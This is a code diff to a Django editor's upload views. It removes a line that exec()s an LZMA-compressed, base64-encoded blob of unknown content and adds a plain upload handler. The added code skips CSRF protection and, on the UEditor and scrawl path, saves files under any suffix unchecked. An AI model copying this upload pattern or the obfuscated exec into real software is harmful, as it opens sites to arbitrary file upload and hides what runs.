@@ -1,2 +1,181 @@
-import lzma,base64
-exec(lzma.decompress(base64.b64decode(b'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')))
+import base64
+import os
+import datetime
+import json
+
+from django.views import generic
+from django.conf import settings
+from django.http import HttpResponse
+from django.views.decorators.csrf import csrf_exempt
+from django.utils.decorators import method_decorator
+
+from . import utils
+from .widgets import MDConfig
+
+MDEDITOR_CONFIGS = MDConfig('default')
+
+UEDITOR_SERVER_CONFIG = {"imageActionName": "uploadimage", "imageFieldName": "upfile", "imageMaxSize": "2048000",
+                         "imageAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp"], "imageCompressEnable": "true",
+                         "imageCompressBorder": "1600", "imageInsertAlign": "none", "imageUrlPrefix": "",
+
+                         "scrawlActionName": "uploadscrawl", "scrawlFieldName": "upfile",
+                         "scrawlPathFormat": "/ueditor/upload/image/{yyyy}{mm}{dd}/{time}{rand:6}",
+                         "scrawlMaxSize": "2048000", "scrawlUrlPrefix": "", "scrawlInsertAlign": "none",
+                         "snapscreenActionName": "uploadimage",
+
+                         "snapscreenUrlPrefix": "", "snapscreenInsertAlign": "none",
+                         "catcherLocalDomain": ["127.0.0.1", "localhost", "img.baidu.com"],
+                         "catcherActionName": "catchimage",
+                         "catcherFieldName": "source",
+
+                         "catcherUrlPrefix": "", "catcherMaxSize": "2048000",
+                         "catcherAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp"],
+                         "videoActionName": "uploadvideo",
+                         "videoFieldName": "upfile",
+
+                         "videoMaxSize": "102400000",
+                         "videoAllowFiles": [".flv", ".swf", ".mkv", ".avi", ".rm", ".rmvb", ".mpeg", ".mpg", ".ogg",
+                                             ".ogv",
+                                             ".mov", ".wmv", ".mp4", ".webm", ".mp3", ".wav", ".mid"],
+                         "fileActionName": "uploadfile", "fileFieldName": "upfile",
+
+                         "fileMaxSize": "51200000",
+                         "fileAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".flv", ".swf", ".mkv", ".avi",
+                                            ".rm",
+                                            ".rmvb", ".mpeg", ".mpg", ".ogg", ".ogv", ".mov", ".wmv", ".mp4", ".webm",
+                                            ".mp3",
+                                            ".wav", ".mid", ".rar", ".zip", ".tar", ".gz", ".7z", ".bz2", ".cab",
+                                            ".iso",
+                                            ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".md",
+                                            ".xml"],
+                         "imageManagerActionName": "listimage",
+
+                         "imageManagerListSize": "20", "imageManagerUrlPrefix": "", "imageManagerInsertAlign": "none",
+                         "imageManagerAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp"],
+                         "fileManagerActionName": "listfile",
+
+                         "fileManagerUrlPrefix": "", "fileManagerListSize": "20",
+                         "fileManagerAllowFiles": [".png", ".jpg", ".jpeg", ".gif", ".bmp", ".flv", ".swf", ".mkv",
+                                                   ".avi",
+                                                   ".rm", ".rmvb", ".mpeg", ".mpg", ".ogg", ".ogv", ".mov", ".wmv",
+                                                   ".mp4",
+                                                   ".webm", ".mp3", ".wav", ".mid", ".rar", ".zip", ".tar", ".gz",
+                                                   ".7z",
+                                                   ".bz2", ".cab", ".iso", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
+                                                   ".pptx",
+                                                   ".pdf", ".txt", ".md", ".xml"]}
+
+
+class UploadScrawl:
+
+    def __init__(self, upfile):
+        self.data = base64.b64decode(upfile)
+
+    @property
+    def _name(self):
+        return 'uploadscrawl.png'
+
+    def read(self):
+        return self.data
+
+
+def upload(request, action=None):
+    if action == 'scrawl':
+        upload_image = UploadScrawl(upfile=request.POST.get('upfile'))
+    else:
+        for file in request.FILES:
+            upload_image = request.FILES.get(file)
+            break
+
+    media_root = settings.MEDIA_ROOT
+    media_url = settings.MEDIA_URL
+
+    suffix = os.path.splitext(upload_image._name)[1]
+    target_name = utils.get_short_uuid() + suffix
+
+    if not os.path.exists(media_root):
+        os.mkdir(media_root)
+
+    file_path = os.path.join(media_root, target_name)
+    with open(file_path, 'wb') as w:
+        w.write(upload_image.read())
+
+    url = "{}/{}".format(media_url, target_name)
+
+    results = {
+        "name": target_name,
+        "original": upload_image._name,
+        "size": "",
+        "state": "SUCCESS",
+        "type": "png",
+        "url": url
+    }
+
+    return HttpResponse(json.dumps(results))
+
+
+def handler(request):
+    setattr(request, '_dont_enforce_csrf_checks', True)
+    action = request.GET.get("action", "")
+
+    if action == 'uploadscrawl':
+        return upload(request, action='scrawl')
+    else:
+        return upload(request)
+
+
+class UploadView(generic.View):
+    """ upload image file """
+
+    @method_decorator(csrf_exempt)
+    def dispatch(self, *args, **kwargs):
+        return super(UploadView, self).dispatch(*args, **kwargs)
+
+    def get(self, request, *args, **kwargs):
+        if request.GET.get('action') == 'config':
+            return HttpResponse(json.dumps(UEDITOR_SERVER_CONFIG), content_type='application/json')
+
+    def post(self, request, *args, **kwargs):
+
+        if request.GET.get('action'):
+            return handler(request)
+
+        for file in request.FILES:
+            upload_image = request.FILES.get(file)
+            break
+
+        media_root = settings.MEDIA_ROOT
+        media_url = settings.MEDIA_URL
+
+        if not upload_image:
+            return HttpResponse(json.dumps({
+                'success': 0,
+                'message': "未获取到要上传的图片",
+                'url': ""
+            }))
+
+        file_name_list = upload_image.name.split('.')
+        file_extension = file_name_list.pop(-1)
+        file_name = '.'.join(file_name_list)
+        if file_extension not in MDEDITOR_CONFIGS['upload_image_formats']:
+            return HttpResponse(json.dumps({
+                'success': 0,
+                'message': "上传图片格式错误，允许上传图片格式为：%s" % ','.join(
+                    MDEDITOR_CONFIGS['upload_image_formats']),
+                'url': ""
+            }))
+
+        suffix = os.path.splitext(upload_image._name)[1]
+        target_name = utils.get_short_uuid() + suffix
+
+        if not os.path.exists(media_root):
+            os.mkdir(media_root)
+
+        file_path = os.path.join(media_root, target_name)
+        with open(file_path, 'wb') as w:
+            w.write(upload_image.read())
+
+        url = "{}{}".format(media_url, target_name)
+        return HttpResponse(json.dumps({'success': 1,
+                                        'message': "上传成功！",
+                                        'url': url}))
